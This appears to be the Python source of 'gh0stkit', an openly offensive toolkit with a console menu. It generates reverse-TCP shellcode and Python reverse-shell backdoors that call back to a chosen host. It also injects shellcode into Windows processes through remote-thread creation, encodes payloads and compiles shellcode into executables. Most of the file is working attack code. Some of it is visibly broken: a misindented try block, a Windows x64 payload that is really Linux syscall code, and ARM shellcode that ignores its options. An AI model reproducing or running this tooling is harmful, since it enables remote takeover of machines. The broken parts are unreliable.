import os
import subprocess
import tempfile
from colorama import Fore, Style
import sys
import base64
import struct
import ctypes
import time
from colorama import Fore, Style, init, Back
import pyfiglet

def print_banner():
    banner = """  

    .-----.
   .' -   - '.
  |  .-. .-.  |
  |  | | | |  |
   | |o| |o| |
  _|    ^    |_
 | | '---'  | |
 | |`--. .--`| |
| |'---` `---'| |
'.__. gh0st  .__.'
    `|  kit |`
     |     |
     |      '--.
      '.        `|
        `'---.   |
              ) /
              ||

"""
    print(Back.BLACK + Fore.RED + Style.BRIGHT + banner + Style.RESET_ALL)

def print_interface():
    print_banner()
    print(Back.BLACK + Fore.GREEN + Style.BRIGHT + "  + -- [ gh0stkit v1 ]" + Fore.YELLOW + Style.BRIGHT + "  - BETA" + Style.RESET_ALL)
    print(Back.BLACK + Fore.GREEN + Style.BRIGHT + "  + -- [ 5 shellcode ]" + Style.RESET_ALL)
    print(Back.BLACK + Fore.GREEN + Style.BRIGHT + "  + -- [ 4 encoders ]" + Style.RESET_ALL)
    print(Back.BLACK + Fore.GREEN + Style.BRIGHT + "  + -- [ 1 injector ]" + Style.RESET_ALL)
    print(Back.BLACK + Fore.GREEN + Style.BRIGHT + "  + -- [ 2 backdoors ]" + Style.RESET_ALL)
    print(Back.BLACK + Fore.GREEN + Style.BRIGHT + "  + -- [ Open Source ]" + Style.RESET_ALL)
    print(Back.BLACK + Fore.YELLOW + Style.BRIGHT + "      |  1 Different OS" + Style.RESET_ALL)
    print(Back.BLACK + Fore.YELLOW + Style.BRIGHT + "      |  (ShellCodes/executable files)" + Style.RESET_ALL)
    print(Back.BLACK + Fore.YELLOW + Style.BRIGHT + "      |  (PE, ELF, DLL, RAR, DEB etc...)" + Style.RESET_ALL)
    print(Back.BLACK + Fore.YELLOW + Style.BRIGHT + "      |  (ReverseShell)" + Style.RESET_ALL)
    print(Back.BLACK + Fore.RED + Style.BRIGHT + "         |  https://github.com/livepwn/gh0stkit" + Style.RESET_ALL)


from Crypto.Cipher import AES

class ToolKit:
    def __init__(self):
        self.modules = {
            "shellcode": ShellcodeModule(),
            "backdoor": BackdoorModule(),
            "injector": InjectorModule(),
            "encoder": EncoderModule(),
            "executable": ExecutableModule(),
        }
        self.current_module = None

    def run(self):

        while True:
            print(Back.BLACK + Fore.CYAN + Style.BRIGHT + "\ngh0stkit> " + Style.RESET_ALL, end="")
            cmd = input("").strip().split()
            if not cmd:
                continue
            if cmd[0] == "help":
                self.show_help()
            elif cmd[0] == "os":
                self.execute_os_command(cmd[1:])
            elif cmd[0] == "banner":
                self.show_banner()
            elif cmd[0] == "clear":
                self.clear_screen()
            elif cmd[0] == "show":
                self.show_database(cmd[1])
            elif cmd[0] == "use":
                self.use_module(cmd[1])
            elif cmd[0] == "back":
                self.current_module = None
            elif cmd[0] == "exit":
                sys.exit(0)
            else:
                print(f"Unknown command:{cmd[0]}")

    def show_banner(self):
        print("""
             
                               _.-, 
                          _ .-'  / .._
                       .-:'/ - - |:::::-.
                     .::: '  e e  ' '-::::.
                    ::::'(    ^    )_.::::::
                   ::::.' '.  o   '.::::'.'/_
               .  :::.' gh0st  -  .::::'_   _.:
             .-''---' .'|      .::::'   '''::::
            '. ..-:::'  |    .::::'        ::::
             '.' ::::    | .::::'   kit   ::::
                  ::::   .::::'           ::::
                   ::::.::::'._          ::::
                    ::::::' /  '-      .::::
                     '::::-/__    __.-::::'
                       '-::::::::::::::-'
                           '''::::'''
                """ )

    def show_help(self):
        print("""
        General Commands:
        help                - Help Menu
        os <command>        - Execute OS command
        banner              - Show Banner
        clear               - Clear the screen
        show <database>     - Show database (shellcodes, backdoors, injectors, encoders)
        use <module>        - Execute the specified module
        back                - Return to the main menu
        exit                - Close Application

        Modules:
        shellcode           - Shellcode generation
        backdoor            - Backdoor creation
        injector            - Injector tools
        encoder             - Encoding tools
        """)

    def execute_os_command(self, command):
        os.system(" ".join(command))

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")

    def show_database(self, database):
        if database == "shellcodes":
            print("Available Shellcodes:")
            print("  - linux/x86/reverse_tcp")
            print("  - linux/x64/reverse_tcp")
            print("  - windows/x86/reverse_tcp")
            print("  - windows/x64/reverse_tcp")
            print("  - arm/reverse_tcp")
        elif database == "backdoors":
            print("Available Backdoors:")
            print("  - python/windows/reverse_tcp")
            print("  - python/linux/reverse_tcp")
        elif database == "injectors":
            print("Available Injectors:")
            print("  - shellcode (Windows x86/x64)")
        elif database == "encoders":
            print("Available Encoders:")
            print("  - xor")
            print("  - base64")
            print("  - aes")
            print("  - rot13")
        else:
            print(f"Unknown database: {database}")

    def use_module(self, module_name):
        if module_name in self.modules:
            self.current_module = self.modules[module_name]
            self.current_module.run()
        else:
            print(f"Module not found: {module_name}")

class ShellcodeModule:
    def __init__(self):
        self.options = {
            "LHOST": "127.0.0.1",
            "LPORT": "4444",
            "PLATFORM": "linux/x86",
        }

    def run(self):
        print("Shellcode Module")
        print("Type 'help' for available commands.")
        while True:
            print(Back.BLACK + Fore.CYAN + Style.BRIGHT + "\ngh0stkit/shellcode > " + Style.RESET_ALL, end="")
            cmd = input("").strip().split()
            if not cmd:
                continue
            if cmd[0] == "help":
                self.show_help()
            elif cmd[0] == "set":
                self.set_option(cmd[1], cmd[2])
            elif cmd[0] == "unset":
                self.unset_option(cmd[1])
            elif cmd[0] == "generate":
                self.generate_shellcode()
            elif cmd[0] == "show":
                self.show_options()
            elif cmd[0] == "os":
                self.execute_os_command(cmd[1:])
            elif cmd[0] == "clear":
                self.clear_screen()
            elif cmd[0] == "back":
                break
            elif cmd[0] == "exit":
                sys.exit(0)
            else:
                print(f"Unknown command: {cmd[0]}")


    def show_help(self):
        print("""
        Shellcode Commands:
        help                - Help menu
        set <option> <value> - Set value of options
        unset <option>      - Unset value of options
        generate            - Generate shellcode
        show options        - Show current options
        os <command>        - Execute OS command
        clear               - Clear the screen
        back                - Return to the main menu
        exit                - Close Application
        """)

    def set_option(self, option, value):
        if option in self.options:
            self.options[option] = value
            print(f"Set {option} to {value}")
        else:
            print(f"Invalid option: {option}")

    def unset_option(self, option):
        if option in self.options:
            self.options[option] = ""
            print(f"Unset {option}")
        else:
            print(f"Invalid option: {option}")

    def generate_shellcode(self):
        lhost = self.options["LHOST"]
        lport = int(self.options["LPORT"])
        platform = self.options["PLATFORM"]

        if platform == "linux/x86":
            shellcode = self.linux_x86_reverse_tcp(lhost, lport)
        elif platform == "linux/x64":
            shellcode = self.linux_x64_reverse_tcp(lhost, lport)
        elif platform == "windows/x86":
            shellcode = self.windows_x86_reverse_tcp(lhost, lport)
        elif platform == "windows/x64":
            shellcode = self.windows_x64_reverse_tcp(lhost, lport)
        elif platform == "arm":
            shellcode = self.arm_reverse_tcp(lhost, lport)
        else:
            print(f"Unsupported platform: {platform}")
            return

        print("\nGenerated Shellcode:")
        print(''.join(f"\\x{byte:02x}" for byte in shellcode))
        print("\n")

    def linux_x86_reverse_tcp(self, lhost, lport):
        # Linux x86 reverse TCP shellcode
        shellcode = (
            b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a"
            b"\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68" + struct.pack(">I", self.ip_to_int(lhost)) +
            b"\x66\x68" + struct.pack(">H", lport) + b"\x66\x6a\x02\x89\xe1\x6a\x10"
            b"\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79"
            b"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
            b"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
        return shellcode

    def linux_x64_reverse_tcp(self, lhost, lport):
        # Linux x64 reverse TCP shellcode
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
            b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
            b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
            b"\x02" + struct.pack(">H", lport) + b"\xc7\x44\x24\x04" + struct.pack(">I", self.ip_to_int(lhost)) +
            b"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31"
            b"\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31"
            b"\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48"
            b"\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
        )
        return shellcode

    def windows_x86_reverse_tcp(self, lhost, lport):
        # Windows x86 reverse TCP shellcode
        shellcode = (
            b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b"
            b"\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c"
            b"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
            b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20"
            b"\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac"
            b"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
            b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
            b"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
            b"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77"
            b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00"
            b"\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
            b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x68" + struct.pack("<I", self.ip_to_int(lhost)) +
            b"\x66\x68" + struct.pack(">H", lport) + b"\x66\x6a\x02\x89\xe6\x6a"
            b"\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
            b"\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57"
            b"\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
            b"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53"
            b"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec"
            b"\xc3"
        )
        return shellcode

    def windows_x64_reverse_tcp(self, lhost, lport):
        # Windows x64 reverse TCP shellcode
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
            b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
            b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
            b"\x02" + struct.pack(">H", lport) + b"\xc7\x44\x24\x04" + struct.pack(">I", self.ip_to_int(lhost)) +
            b"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31"
            b"\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31"
            b"\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48"
            b"\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
        )
        return shellcode

    def arm_reverse_tcp(self, lhost, lport):
        # ARM reverse TCP shellcode
        shellcode = (
            b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90"
            b"\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x00"
        )
        return shellcode

    def ip_to_int(self, ip):
        parts = list(map(int, ip.split('.')))
        return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]

    def show_options(self):
        print("Current Options:")
        for key, value in self.options.items():
            print(f"{key}: {value}")

    def execute_os_command(self, command):
        os.system(" ".join(command))

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")

class BackdoorModule:
    def __init__(self):
        self.options = {
            "LHOST": "127.0.0.1",
            "LPORT": "4444",
            "PLATFORM": "python/windows",
        }

    def run(self):
        print("Backdoor Module")
        print("Type 'help' for available commands.")
        while True:
            print(Back.BLACK + Fore.CYAN + Style.BRIGHT + "\ngh0stkit/backdoor> " + Style.RESET_ALL, end="")
            cmd = input("").strip().split()
            if not cmd:
                continue
            if cmd[0] == "help":
                self.show_help()
            elif cmd[0] == "set":
                self.set_option(cmd[1], cmd[2])
            elif cmd[0] == "unset":
                self.unset_option(cmd[1])
            elif cmd[0] == "generate":
                self.generate_backdoor()
            elif cmd[0] == "show":
                self.show_options()
            elif cmd[0] == "os":
                self.execute_os_command(cmd[1:])
            elif cmd[0] == "clear":
                self.clear_screen()
            elif cmd[0] == "back":
                break
            elif cmd[0] == "exit":
                sys.exit(0)
            else:
                print(f"Unknown command: {cmd[0]}")

    def show_help(self):
        print("""
        Backdoor Commands:
        help                - Help menu
        set <option> <value> - Set value of options
        unset <option>      - Unset value of options
        generate            - Generate backdoor
        show options        - Show current options
        os <command>        - Execute OS command
        clear               - Clear the screen
        back                - Return to the main menu
        exit                - Close Application
        """)

    def set_option(self, option, value):
        if option in self.options:
            self.options[option] = value
            print(f"Set {option} to {value}")
        else:
            print(f"Invalid option: {option}")

    def unset_option(self, option):
        if option in self.options:
            self.options[option] = ""
            print(f"Unset {option}")
        else:
            print(f"Invalid option: {option}")

    def generate_backdoor(self):
        lhost = self.options["LHOST"]
        lport = int(self.options["LPORT"])
        platform = self.options["PLATFORM"]

        if platform == "python/windows":
            backdoor = self.python_windows_backdoor(lhost, lport)
        elif platform == "python/linux":
            backdoor = self.python_linux_backdoor(lhost, lport)
        else:
            print(f"Unsupported platform: {platform}")
            return

        print("\nGenerated Backdoor:")
        print(backdoor)
        print("\n")

    def python_windows_backdoor(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""

    def python_linux_backdoor(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""

    def show_options(self):
        print("Current Options:")
        for key, value in self.options.items():
            print(f"{key}: {value}")

    def execute_os_command(self, command):
        os.system(" ".join(command))

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")

class InjectorModule:
    def run(self):
        print("Injector Module")
        print("Type 'help' for available commands.")
        while True:
            print(Back.BLACK + Fore.CYAN + Style.BRIGHT + "\ngh0stkit/injector> " + Style.RESET_ALL, end="")
            cmd = input("").strip().split()
            if not cmd:
                continue
            if cmd[0] == "help":
                self.show_help()
            elif cmd[0] == "inject":
                self.inject_shellcode(cmd[1])
            elif cmd[0] == "os":
                self.execute_os_command(cmd[1:])
            elif cmd[0] == "back":
                break
            elif cmd[0] == "exit":
                sys.exit(0)
            else:
                print(f"Unknown command: {cmd[0]}")

    def show_help(self):
        print("""
        Injector Commands:
        help                - Help menu
        inject <pid>        - Inject shellcode into a process
        os <command>        - Execute OS command
        back                - Return to the main menu
        exit                - Close Application
        """)

    def inject_shellcode(self, pid):
        if os.name != "nt":
            print("Process injection is only supported on Windows.")
            return

        try:
            pid = int(pid)
        except ValueError:
            print("Invalid PID.")
            return

        # Example shellcode (Windows x64 MessageBox)
        shellcode = (
            b"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00\x48"
            b"\x8D\x0D\x52\x00\x00\x00\xE8\x9C\x00\x00\x00\x4C\x8B\xF8\x48\x8D"
            b"\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00\x00\x48\x8D"
            b"\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33\xC9\x4C\x8D\x05"
            b"\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00\x48\x33\xC9\xFF\xD0"
            b"\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D\x0A\x00\x00\x00\xE8\x56"
            b"\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B\x45\x52\x4E\x45\x4C\x33\x32"
            b"\x2E\x44\x4C\x4C\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79"
            b"\x41\x00\x55\x53\x45\x52\x33\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73"
            b"\x73\x61\x67\x65\x42\x6F\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x57"
            b"\x6F\x72\x6C\x64\x00\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
             )

        # Get handle to the target process
        PROCESS_ALL_ACCESS = 0x1F0FFF
        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            print(f"Failed to open process with PID {pid}.")
            return

        # Allocate memory in the target process
        shellcode_size = len(shellcode)
        remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
            process_handle, None, shellcode_size, 0x3000, 0x40
        )
        if not remote_memory:
            print("Failed to allocate memory in the target process.")
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return

        # Write shellcode to the allocated memory
        written = ctypes.c_ulong(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            process_handle, remote_memory, shellcode, shellcode_size, ctypes.byref(written)
            )
        if written.value != shellcode_size:
            print("Failed to write shellcode to the target process.")
            ctypes.windll.kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return

        # Create a remote thread to execute the shellcode
        thread_id = ctypes.c_ulong(0)
        thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
            process_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id))
        if not thread_handle:
            print("Failed to create remote thread.")
            ctypes.windll.kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            return

        print(f"Shellcode injected into process with PID {pid}.")
        ctypes.windll.kernel32.CloseHandle(thread_handle)
        ctypes.windll.kernel32.CloseHandle(process_handle)

    def execute_os_command(self, command):
        os.system(" ".join(command))

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")
    
class EncoderModule:
    def __init__(self):
        self.options = {
            "ENCODING": "xor",
            "KEY": "secret",
        }

    def run(self):
        print("Encoder Module")
        print("Type 'help' for available commands.")
        while True:  # Main loop for the encoder module
            print(Back.BLACK + Fore.CYAN + Style.BRIGHT + "\ngh0stkit/encoder> " + Style.RESET_ALL, end="")
            cmd = input("").strip().split()
            if not cmd:
                continue  # Skip to the next iteration if no command is entered

            if cmd[0] == "help":
                self.show_help()
            elif cmd[0] == "set":
                if len(cmd) < 3:
                    print("Usage: set <option> <value>")
                else:
                    self.set_option(cmd[1], cmd[2])
            elif cmd[0] == "unset":
                if len(cmd) < 2:
                    print("Usage: unset <option>")
                else:
                    self.unset_option(cmd[1])
            elif cmd[0] == "encode":
                if len(cmd) < 2:
                    print("Usage: encode <data>")
                else:
                    self.encode_data(cmd[1])
            elif cmd[0] == "show":
                self.show_options()
            elif cmd[0] == "os":
                if len(cmd) < 2:
                    print("Usage: os <command>")
                else:
                    self.execute_os_command(cmd[1:])
            elif cmd[0] == "clear":
                self.clear_screen()
            elif cmd[0] == "back":
                break  # Exit the loop and return to the main menu
            elif cmd[0] == "exit":
                sys.exit(0)  # Exit the application
            else:
                print(f"Unknown command: {cmd[0]}")

    def show_help(self):
        print("""
        Encoder Commands:
        help                - Help menu
        set <option> <value> - Set value of options
        unset <option>      - Unset value of options
        encode <data>       - Encode the provided data
        show options        - Show current options
        os <command>        - Execute OS command
        clear               - Clear the screen
        back                - Return to the main menu
        exit                - Close Application
        """)

    def set_option(self, option, value):
        if option in self.options:
            self.options[option] = value
            print(f"Set {option} to {value}")
        else:
            print(f"Invalid option: {option}")

    def unset_option(self, option):
        if option in self.options:
            self.options[option] = ""
            print(f"Unset {option}")
        else:
            print(f"Invalid option: {option}")

    def encode_data(self, data):
        encoding = self.options["ENCODING"]
        key = self.options["KEY"]

        if encoding == "xor":
            encoded = self.xor_encode(data.encode(), key.encode())
            print("\nXOR Encoded Data:")
            print(encoded.decode())
        elif encoding == "base64":
            encoded = base64.b64encode(data.encode()).decode()
            print("\nBase64 Encoded Data:")
            print(encoded)
        elif encoding == "aes":
            encoded = self.aes_encrypt(data.encode(), key.encode())
            print("\nAES Encrypted Data:")
            print(encoded.decode())
        elif encoding == "rot13":
            encoded = self.rot13_encode(data)
            print("\nROT13 Encoded Data:")
            print(encoded)
        else:
            print(f"Unsupported encoding: {encoding}")

    def xor_encode(self, data, key):
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

    def aes_encrypt(self, data, key):
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)

    def rot13_encode(self, data):
        return data.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
        ))

    def show_options(self):
        print("Current Options:")
        for key, value in self.options.items():
            print(f"{key}: {value}")
class ExecutableModule:
    def __init__(self):
        self.options = {
        "PLATFORM": "windows",  # Default platform
        "OUTPUT": "output.exe",  # Default output file
        }

    def run(self):
        print(Fore.GREEN + "Executable Generation Module")
        print("Type 'help' for available commands." + Style.RESET_ALL)
        while True:
            print(Back.BLACK + Fore.CYAN + Style.BRIGHT + "\ngh0stkit/executable> " + Style.RESET_ALL, end="")
            cmd = input("").strip().split()
            if not cmd:
                continue
            if cmd[0] == "help":
                self.show_help()
            elif cmd[0] == "set":
                self.set_option(cmd[1], cmd[2])
            elif cmd[0] == "generate":
                self.generate_executable()
            elif cmd[0] == "show":
                self.show_options()
            elif cmd[0] == "back":
                break
            elif cmd[0] == "exit":
                sys.exit(0)
            else:
                print(Fore.RED + f"Unknown command: {cmd[0]}" + Style.RESET_ALL)

    def show_help(self):
        print(Fore.YELLOW + """
        Executable Commands:
        help                - Show this help menu
        set <option> <value> - Set an option (e.g., set PLATFORM windows)
        generate            - Generate an executable file
        show options        - Show current options
        back                - Return to the main menu
        exit                - Exit the tool
        """ + Style.RESET_ALL)

    def set_option(self, option, value):
        if option in self.options:
            self.options[option] = value
            print(Fore.GREEN + f"Set {option} to {value}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Invalid option: {option}" + Style.RESET_ALL)

    def show_options(self):
        print(Fore.GREEN + "Current Options:")
        for key, value in self.options.items():
            print(f"{key}: {value}")
        print(Style.RESET_ALL)

    def generate_executable(self):
        platform = self.options["PLATFORM"]
        output_file = self.options["OUTPUT"]

        # Generate shellcode using the ShellcodeModule
        shellcode = self.generate_shellcode()
        if not shellcode:
            print(Fore.RED + "Failed to generate shellcode." + Style.RESET_ALL)
            return

        # Compile shellcode into an executable
        if platform == "windows":
            self.compile_windows_executable(shellcode, output_file)
        elif platform == "linux":
            self.compile_linux_executable(shellcode, output_file)
        else:
            print(Fore.RED + f"Unsupported platform: {platform}" + Style.RESET_ALL)

    def generate_shellcode(self):
        # Use the ShellcodeModule to generate shellcode
        # Replace this with your actual shellcode generation logic
        return b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    def compile_windows_executable(self, shellcode, output_file):
        # Create a temporary C file
        temp_c_file = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".c", mode="w") as temp_c_file:
            temp_c_filename = temp_c_file.name  # Store the filename for later use

            # Format shellcode as a C array
            shellcode_array = ", ".join(f"0x{byte:02x}" for byte in shellcode)

            # Write the C code template
            c_code = f"""
            #include <windows.h>

            unsigned char shellcode[] = {{{shellcode_array}}};

            int main() {{
                void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (exec == NULL) {{
                    return 1;
                }}
                memcpy(exec, shellcode, sizeof(shellcode));
                ((void(*)())exec)();
                return 0;
            }}
            """
            temp_c_file.write(c_code)

        # Compile the C file using mingw
        subprocess.run(["x86_64-w64-mingw32-gcc", temp_c_filename, "-o", output_file], check=True)
        print(Fore.GREEN + f"Windows executable generated: {output_file}" + Style.RESET_ALL)

    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Failed to compile Windows executable: {e}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}" + Style.RESET_ALL)
    finally:
        # Clean up the temporary C file
        if temp_c_filename and os.path.exists(temp_c_filename):
            os.remove(temp_c_filename)

    def execute_os_command(self, command):
        os.system(" ".join(command))

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")
if __name__ == "__main__":
    print_interface()
    toolkit = ToolKit()
    toolkit.run()
